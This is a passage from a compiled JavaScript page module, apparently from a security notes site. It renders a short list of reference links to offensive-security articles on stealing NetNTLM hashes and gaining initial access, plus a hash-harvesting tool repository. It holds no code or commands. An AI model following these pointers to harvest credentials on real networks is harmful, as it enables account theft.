rel="noreferrer">https://mgp25.com/research/infosec/Leaking-NTLM-hashes/</a></p><p><a href="https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office" target="_blank" rel="noreferrer">https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office</a></p><p><a href="https://www.ired.team/offensive-security/initial-access" target="_blank" rel="noreferrer">https://www.ired.team/offensive-security/initial-access</a></p><p><a href="https://github.com/mdsecactivebreach/Farmer" target="_blank" rel="noreferrer">https://github.com/mdsecactivebreach/Farmer</a></p>',18))])}const C=o(d,[["render",c]]);export{f as __pageData,C as default};
